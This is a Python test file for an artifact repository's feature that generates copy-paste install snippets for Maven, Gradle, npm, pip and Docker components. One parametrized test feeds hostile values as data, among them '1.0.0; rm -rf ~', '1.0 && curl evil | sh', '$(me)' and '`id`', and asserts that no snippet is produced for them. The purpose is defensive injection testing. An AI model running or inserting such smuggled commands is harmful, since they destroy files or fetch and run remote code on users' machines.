"""How a component is used: what each format writes for a person to copy."""

import xml.etree.ElementTree as ElementTree

import pytest

from megooarti.repositories import formats, service
from megooarti.repositories.formats import ComponentKey, Usage, get_format
from megooarti.system.settings_store import set_setting
from tests.accounts import PASSWORD, basic
from tests.repositories.npm.conftest import package_tarball

HERE = "https://repo.example.com/repository"
VERSION = "com/acme/app/1.0"


@pytest.fixture
async def root(make_user) -> dict[str, str]:
    await make_user("root", roles=["admin"])
    return basic("root", PASSWORD)


def usage(format: str, address: str, key: ComponentKey, *files: str) -> list[Usage]:
    return get_format(format).usage(address, key, files)


def test_a_maven_artifact_is_a_dependency_of_a_build():
    found = usage(
        "maven",
        f"{HERE}/releases/",
        ComponentKey("com.acme", "app", "1.0"),
        f"{VERSION}/app-1.0.jar",
        f"{VERSION}/app-1.0.pom",
        f"{VERSION}/app-1.0-sources.jar",
    )

    assert [(entry.label, entry.language) for entry in found] == [
        ("Maven", "xml"),
        ("Gradle (Kotlin)", "kotlin"),
        ("Gradle (Groovy)", "groovy"),
    ]
    dependency = ElementTree.fromstring(found[0].text)
    assert {child.tag: child.text for child in dependency} == {
        "groupId": "com.acme",
        "artifactId": "app",
        "version": "1.0",
    }
    assert found[1].text == 'implementation("com.acme:app:1.0")'
    assert found[2].text == "implementation 'com.acme:app:1.0'"


@pytest.mark.parametrize(
    ("files", "kind"),
    [
        (["app-1.0.war", "app-1.0.pom"], "war"),
        (["app-1.0.pom"], "pom"),
        (["app-1.0.aar", "app-1.0.module", "app-1.0.pom", "app-1.0.aar.asc"], "aar"),
        (["app-1.0.zip", "app-1.0.jar"], None),
        (["app-1.0-sources.jar"], None),
        ([], None),
    ],
    ids=["war", "pom", "aar", "jar-too", "classifier-only", "nothing"],
)
def test_what_is_not_a_jar_is_asked_for_by_its_kind(files, kind):
    key = ComponentKey("com.acme", "app", "1.0")

    found = usage("maven", f"{HERE}/releases/", key, *(f"{VERSION}/{name}" for name in files))

    dependency = ElementTree.fromstring(found[0].text)
    assert dependency.findtext("type") == kind
    suffix = f"@{kind}" if kind else ""
    assert found[1].text == f'implementation("com.acme:app:1.0{suffix}")'
    assert found[2].text == f"implementation 'com.acme:app:1.0{suffix}'"


def test_an_npm_package_is_installed_from_its_registry():
    plain = usage("npm", f"{HERE}/npm/", ComponentKey("", "tool", "1.0.0"), "tool/-/tool-1.0.0.tgz")
    scoped = usage("npm", f"{HERE}/npm/", ComponentKey("acme", "tool", "2.0.0-beta.1"))

    assert [(entry.label, entry.language) for entry in plain] == [("npm", "shell")]
    assert plain[0].text == f"npm install tool@1.0.0 --registry={HERE}/npm/"
    assert scoped[0].text == f"npm install @acme/tool@2.0.0-beta.1 --registry={HERE}/npm/"


def test_a_python_package_is_installed_from_its_index():
    found = usage("pypi", f"{HERE}/pypi/", ComponentKey("", "my-package", "2.0.post1"))

    assert [(entry.label, entry.language) for entry in found] == [("pip", "shell")]
    assert found[0].text == f"pip install --index-url {HERE}/pypi/simple/ my-package==2.0.post1"


def test_an_image_is_pulled_by_its_tag():
    found = usage("docker", "repo.example.com/images", ComponentKey("", "team/app", "1.0"))
    kept = usage(
        "docker", "repo.example.com/images", ComponentKey("manifests", "team/app", "sha256:ab")
    )

    assert [(entry.label, entry.language) for entry in found] == [("Docker", "shell")]
    assert found[0].text == "docker pull repo.example.com/images/team/app:1.0"
    assert kept == []


def test_a_file_has_its_address_and_nothing_to_copy():
    assert usage("raw", f"{HERE}/files/", ComponentKey("docs", "guide.md"), "docs/guide.md") == []


@pytest.mark.parametrize(
    ("format", "key"),
    [
        ("maven", ComponentKey("com.acme", 'app") ; evil("', "1.0")),
        ("maven", ComponentKey("com.acme", "app", "1.0'\nevil()")),
        ("maven", ComponentKey("com acme", "app", "1.0")),
        ("npm", ComponentKey("", "tool", "1.0.0; rm -rf ~")),
        ("npm", ComponentKey("ac$(me)", "tool", "1.0.0")),
        ("pypi", ComponentKey("", "greeter", "1.0 && curl evil | sh")),
        ("pypi", ComponentKey("", "greeter", "1!2.0")),
        ("docker", ComponentKey("", "team/app", "1.0`id`")),
        ("npm", ComponentKey("", "--force", "1.0.0")),
        ("npm", ComponentKey("", "tool", "")),
        ("pypi", ComponentKey("", "-r", "1.0")),
        ("docker", ComponentKey("", "team/app", "")),
        ("maven", ComponentKey("", "app", "1.0")),
    ],
    ids=[
        "quote",
        "newline",
        "space",
        "semicolon",
        "substitution",
        "and",
        "history",
        "backtick",
        "option",
        "no-version",
        "pip-option",
        "no-tag",
        "no-group",
    ],
)
def test_nothing_is_offered_to_paste_that_would_be_more_than_a_name(format, key):
    """What a remote or a deploy named is put where a person will run it."""
    assert usage(format, "https://repo.example.com/repository/x/", key) == []


def test_plain_text_is_what_is_safe_between_other_words():
    assert formats.plain("com.acme", "app_1", "1.0+build-7", "team/app", "x~1", "_x")
    for hostile in (" ", "a b", "a;b", "$x", "`x`", "a'b", 'a"b', "a\nb", "a&b", "<a>", "é", "a!b"):
        assert not formats.plain("fine", hostile)
    # Nothing a client would read as an option, or a shell as a home directory or a path.
    for odd in ("", "-g", "--force", "~root", ".hidden", "/etc"):
        assert not formats.plain("fine", odd)


async def test_a_components_detail_says_how_to_use_it(client, root, db):
    await service.create_repository(
        db,
        name="releases",
        format="maven",
        type="hosted",
        online=True,
        blob_store="default",
        format_config={},
    )
    await set_setting(db, "base_url", "https://repo.example.com/")
    await db.commit()
    stored = await client.post(
        "/api/v1/content/releases/upload",
        data={"group": "com.acme", "artifact": "app", "version": "1.0", "packaging": "war"},
        files=[("file", ("app.war", b"PK war"))],
        headers=root,
    )
    component = stored.json()["components"][0]["id"]

    detail = await client.get(f"/api/v1/content/releases/components/{component}", headers=root)

    assert detail.status_code == 200, detail.text
    found = detail.json()["usage"]
    assert [entry["label"] for entry in found] == ["Maven", "Gradle (Kotlin)", "Gradle (Groovy)"]
    assert set(found[0]) == {"label", "language", "text"}
    assert "<type>war</type>" in found[0]["text"]


async def test_a_package_is_installed_from_the_address_people_are_given(client, root, db):
    await service.create_repository(
        db,
        name="npm",
        format="npm",
        type="hosted",
        online=True,
        blob_store="default",
        format_config={},
    )
    await set_setting(db, "base_url", "https://repo.example.com/")
    await db.commit()
    stored = await client.post(
        "/api/v1/content/npm/upload",
        files=[("file", ("tool.tgz", package_tarball("@acme/tool", "1.0.0")))],
        headers=root,
    )
    component = stored.json()["components"][0]["id"]

    detail = await client.get(f"/api/v1/content/npm/components/{component}", headers=root)

    assert [entry["text"] for entry in detail.json()["usage"]] == [
        "npm install @acme/tool@1.0.0 --registry=https://repo.example.com/repository/npm/"
    ]


async def test_a_file_of_a_raw_repository_has_no_usage(client, files, root):
    await client.put("/repository/files/docs/guide.md", content=b"# Guide", headers=root)
    listed = await client.get("/api/v1/content/files/components", headers=root)

    detail = await client.get(
        f"/api/v1/content/files/components/{listed.json()['items'][0]['id']}", headers=root
    )

    assert detail.json()["usage"] == []
